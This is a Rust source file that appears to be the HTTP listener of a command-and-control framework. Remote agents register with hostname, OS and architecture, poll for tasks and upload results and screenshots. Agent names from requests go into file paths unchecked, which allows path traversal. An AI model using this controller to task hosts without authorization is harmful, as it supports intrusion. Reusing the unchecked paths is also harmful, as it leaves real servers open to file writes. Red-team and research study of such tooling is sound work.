use axum::{
    extract::{Request, State},
    http::StatusCode,
    Json,
    routing::{get, post},
    Router,
};
use hyper::body::Incoming;
use hyper_util::rt::TokioIo;
use log::{error, info};
use std::time::Duration;
use std::sync::Arc;
use tokio::sync::{broadcast, Mutex, watch};
use tower::Service;
use tower_http::trace::TraceLayer;
use tower_http::timeout::TimeoutLayer;

use crate::{
    server::{
        agents::{Agent, AgentData, AgentTask},
        db,
        jobs::JobMessage,
    },
    utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
};

pub async fn start_http_listener(
    job_id: u32,
    host: String,
    port: u16,
    receiver: Arc<Mutex<broadcast::Receiver<JobMessage>>>,
    db_path: String,
) {
    let app = Router::new()
        .route("/", get(hello))
        .route("/reg", post(register))
        .with_state(db_path)
        .route("/task/ask", post(task_ask))
        .route("/task/result", post(task_result))
        .layer((
            TraceLayer::new_for_http(),
            TimeoutLayer::new(Duration::from_secs(10)),
        ));

    let listener = tokio::net::TcpListener::bind(format!("{host}:{port}"))
        .await
        .unwrap();

    info!("Start HTTP listener on {}", listener.local_addr().unwrap());

    let (close_tx, close_rx) = watch::channel(());

    loop {
        let receiver_clone_1 = Arc::clone(&receiver);
        let receiver_clone_2 = Arc::clone(&receiver);

        let (socket, remote_addr) = tokio::select! {
            result = listener.accept() => {
                result.unwrap()
            }
            _ = shutdown_signal(receiver_clone_1) => {
                info!("Signal received, not accepting new connections.");
                break;
            }
        };

        info!("Connection {remote_addr} accepted.");

        let tower_service = app.clone();

        let close_rx = close_rx.clone();

        tokio::spawn(async move {
            let receiver_clone_3 = Arc::clone(&receiver_clone_2);
            let socket = TokioIo::new(socket);

            let hyper_service = hyper::service::service_fn(move |request: Request<Incoming>| {
                tower_service.clone().call(request)
            });

            let conn = hyper::server::conn::http1::Builder::new()
                .serve_connection(socket, hyper_service)
                .with_upgrades();

            let mut conn = std::pin::pin!(conn);

            loop {
                let receiver_clone_3 = Arc::clone(&receiver_clone_3);
                tokio::select! {
                    result = conn.as_mut() => {
                        if let Err(err) = result {
                            info!("failed to serve connection: {err:#}");
                        }
                        break;
                    }

                    _ = shutdown_signal(receiver_clone_3) => {
                        info!("Signal received. Starting shutdown");
                        conn.as_mut().graceful_shutdown();
                    }
                }
            }

            info!("Connection {remote_addr} closed.");
            drop(close_rx);
        });
    }

    drop(close_rx);
    drop(listener);

    info!("Waiting for {} tasks to finish.", close_tx.receiver_count());
    close_tx.closed().await;
}

async fn hello() -> &'static str {
    info!("Agent requested `/`");
    "Hello world!"
}

async fn register(
    State(db_path): State<String>,
    Json(payload): Json<AgentData>,
) -> (StatusCode, String) {

    info!("Agent requested `/reg`");

    let agent = Agent {
        id: 0, // Temporary ID
        name: payload.name,
        hostname: payload.hostname,
        os: payload.os,
        arch: payload.arch,
        listener_url: payload.listener_url,
        task: AgentTask::Empty,
        task_result: None,
    };

    // Check duplicate
    match db::exists_agent(db_path.to_owned(), agent.clone()) {
        Ok(exists) => {
            if exists {
                error!("Agent already exists.");
                // Update the agent name
                match db::update_agent_name(db_path.to_owned(), agent.clone()) {
                    Ok(_) => {
                        info!("Updated the agent name.");
                        // Create directories and folders for the agent
                        mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
                        mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
                        mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
                        mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
                    }
                    Err(e) => {
                        error!("Error updating agent name: {:?}", e);
                    }
                }
                return (StatusCode::OK, "Agent already exists.".to_owned());
            }
        }
        Err(e) => {
            return (StatusCode::OK, format!("Error: {}", e.to_string()));
        }
    }

    match db::add_agent(db_path, agent.clone()) {
        Ok(_) => {
            // Create directories and folders for the agent
            mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
            mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
            mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
            mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();

            (StatusCode::OK, "Agent registered.".to_owned())
        },
        Err(e) => {
            error!("{e}");
            (StatusCode::OK, "Agent already exists.".to_owned())
        }
    }
}

async fn task_ask(Json(payload): Json<AgentData>,) -> (StatusCode, String) {
    info!("Agent requested `/task/ask`");

    if let Ok(task) = read_file(format!("agents/{}/task/name", payload.name)) {
        return (StatusCode::OK, String::from_utf8(task).unwrap());
    } else {
        return (StatusCode::NOT_FOUND, "Task not found.".to_owned());
    }
}

async fn task_result(Json(payload): Json<AgentData>,) -> (StatusCode, String) {
    info!("Agent requested `/task/result`");

    if let Ok(_) = write_file(format!("agents/{}/task/result", payload.name), &payload.task_result.unwrap_or(Vec::new())) {
        // Initialize task
        empty_file(format!("agents/{}/task/name", payload.name)).unwrap();

        return (StatusCode::OK, "The task result sent.".to_owned());
    } else {
        return (StatusCode::NOT_ACCEPTABLE, "Error".to_owned());
    }
}

async fn shutdown_signal(receiver: Arc<Mutex<broadcast::Receiver<JobMessage>>>) {
    // let ctrl_c = async {
    //     tokio::signal::ctrl_c()
    //         .await
    //         .expect("failed to install Ctrl+c handler");
    // };

    // #[cfg(unix)]
    // let terminate = async {
    //     tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())
    //         .expect("failed to install signal handler")
    //         .recv()
    //         .await;
    // };

    // #[cfg(not(unix))]
    // let terminate = std::future::pending::<()>();

    let recv_msg = async {
        let _ = receiver.lock().await.recv().await;
    };

    tokio::select! {
        // _ = ctrl_c => {},
        // _ = terminate => {},
        _ = recv_msg => {},
    }
}